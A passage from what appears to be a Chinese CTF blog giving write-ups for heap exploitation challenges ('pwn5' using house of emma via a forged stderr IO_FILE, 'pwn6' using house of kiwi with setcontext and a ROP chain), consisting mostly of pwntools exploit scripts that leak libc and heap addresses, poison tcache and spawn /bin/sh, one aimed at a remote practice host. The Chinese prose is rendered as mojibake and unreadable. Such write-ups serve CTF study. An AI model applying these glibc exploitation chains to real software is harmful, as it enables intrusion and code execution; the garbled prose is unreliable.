class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    heap_addr2=((u64(sh.recv(<span class="number">8</span>))&lt;&lt;<span class="number">12</span>) &amp; <span class="number">0xffffffffffffffff</span>)+<span class="number">0x380</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    free_hook=libc.sym[<span class="string">&quot;__free_hook&quot;</span>]+libc_addr</span><br><span class="line">    heap_addr1=(((u64(sh.recv(<span class="number">8</span>))^heap_addr2)&lt;&lt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)+<span class="number">0x330</span></span><br><span class="line">    <span class="built_in">next</span>=((heap_addr1&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^free_hook</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    system_addr=libc.sym[<span class="string">&quot;system&quot;</span>]+libc_addr</span><br><span class="line">    new(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>é¢˜ç›®ç›´æ¥è¯´äº†æ˜¯emma,é‚£å°±æ‹¿emmaæ‰“å§ï¼Œemmaä¸€å…±æœ‰ä¸¤ç§æ‰“æ³•ï¼Œä¸€ç§æ˜¯fsopï¼Œåˆ·æ–°ioé“¾ï¼Œæ‰€ä»¥å¯ä»¥ä¼ªé€ ä¸¤ä¸ªæœ‰emmaè°ƒç”¨é“¾çš„ioç»“æ„ï¼Œä¸€ä¸ªç»“æ„æ”¹key,ç„¶åè®©ä¸‹ä¸€ä¸ªioç»“æ„æ‹¿shell,å¦ä¸€ç§æ˜¯æ§åˆ¶stderrç»“æ„ä½“ï¼Œæ„é€ emmaçš„è°ƒç”¨é“¾ï¼Œç„¶åä¿®æ”¹topchunkçš„sizeç”³è¯·å †å—æŠ¥é”™è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°çš„__fxprintfä¸­å°±ä¼šè§¦å‘emmaçš„è°ƒç”¨é“¾äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">       <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ä½¿ç”¨çš„æ˜¯åä¸€ç§æ–¹æ³•ï¼Œæµç¨‹å¦‚ä¸‹,ä¸è¿‡è¿™é“é¢˜å€’æ˜¯ä¸ç”¨setcontext,ç›´æ¥systemæ‹¿shell</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527133817903.png" alt="image-20220527133817903"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28733</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(-<span class="number">4</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x61</span>-<span class="number">0x1e1000</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0xf90</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(libc_addr+<span class="number">0x1e1000</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1ed5b0</span>-<span class="number">0x20</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0xa00</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>))</span><br><span class="line">    fake_IO_FILE=p64(<span class="number">0x00000000fbad2087</span>)</span><br><span class="line">    system_addr=libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    fake_IO_FILE+=p64(heap_addr+<span class="number">0x2100</span>)*<span class="number">8</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(heap_addr)  <span class="comment"># _lock = writable address</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0x1e1a20</span>+libc_addr + <span class="number">0x40</span>)  <span class="comment"># vtable</span></span><br><span class="line">    fake_IO_FILE += p64(heap_addr+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rdi</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># pay=system_addr^(heap_addr+0xf90)</span></span><br><span class="line">    <span class="comment"># pay1=pay&amp;0x7ff</span></span><br><span class="line">    <span class="comment"># pay2=pay&amp;</span></span><br><span class="line">    fake_IO_FILE += p64(ROL(system_addr ^ (heap_addr + <span class="number">0xf90</span>), <span class="number">0x11</span>))</span><br><span class="line">    fake_IO_FILE+=p64(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    edit(-<span class="number">4</span>,fake_IO_FILE)</span><br><span class="line">    <span class="comment">#fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(system_addr ^ (heap_addr + <span class="number">0xf90</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x600</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>pwn6</p>
<p>house of kiwi,ç½‘ä¸Šè®²çš„éå¸¸æ¸…æ¥šï¼Œå°±ä¸è¯´æ”»å‡»æµç¨‹äº†ï¼Œè¿™é“é¢˜æœ€ä¸»è¦çš„é—®é¢˜æ˜¯é™åˆ¶å…±äº«åº“çš„ä½ç½®ï¼Œç„¶åæ²¡æœ‰ç¬¦å·è¡¨è°ƒè¯•çš„æ—¶å€™å¾ˆéš¾å—ï¼Œmarkç»™äº†ç¬¦å·è¡¨å’Œè°ƒè¯•è„šæœ¬æ‰èƒ½è¿›è¡ŒåŠ¨è°ƒ.è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process([<span class="string">&#x27;./ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>:<span class="string">&#x27;./libc-so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26914)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    load1=<span class="string">&quot;source ./loadsym.py\n&quot;</span></span><br><span class="line">    load2=<span class="string">&quot;loadsym &#x27;/home/ctf/getshell/des/pwn4/1/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.31.so&#x27;\n&quot;</span></span><br><span class="line">    gdb.attach(sh,load1+load2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Before the game starts, please give me your name:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;How much do you want?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to put?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Tell me your idea:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to remove?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to look?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to change?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Change your idea:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    init(<span class="string">&#x27;zhangpeng&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x48</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,i,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p8(<span class="number">0xc1</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    _IO_file_jumps_addr=libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]+libc_addr</span><br><span class="line">    <span class="comment">#IO_helper_jumps_addr=libc.sym[&quot;_IO_helper_jumps&quot;]+libc_addr</span></span><br><span class="line">    _IO_helper_jumps_addr=libc_addr+<span class="number">0x1ec960</span>-<span class="number">0xc0</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    setcontent_addr=libc_addr+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_file_jumps_addr+<span class="number">0x60</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">4</span>,p64(setcontent_addr))</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x920</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_helper_jumps_addr+<span class="number">0xa0</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">5</span>,p64(heap_addr+<span class="number">0xa00</span>))</span><br><span class="line">    ret_addr=libc_addr+<span class="number">0x0000000000025679</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_helper_jumps_addr+<span class="number">0Xa8</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">6</span>,p64(ret_addr))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x78</span>+p8(<span class="number">0xc1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    pop_rax=libc_addr+<span class="number">0x000000000004a550</span></span><br><span class="line">    pop_rdi=libc_addr+<span class="number">0x0000000000026b72</span></span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x0000000000027529</span></span><br><span class="line">    pop_rdx_r12=libc_addr+<span class="number">0x000000000011c371</span></span><br><span class="line">    syscall_addr=libc_addr+<span class="number">0x000000000002584d</span></span><br><span class="line">    rop=p64(pop_rax)+p64(<span class="number">59</span>)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_addr+<span class="number">0xa60</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    rop+=p64(syscall_addr)</span><br><span class="line">    rop=rop.ljust(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    rop+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="number">1</span>,rop)</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    debug()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;How much do you want?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to put?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

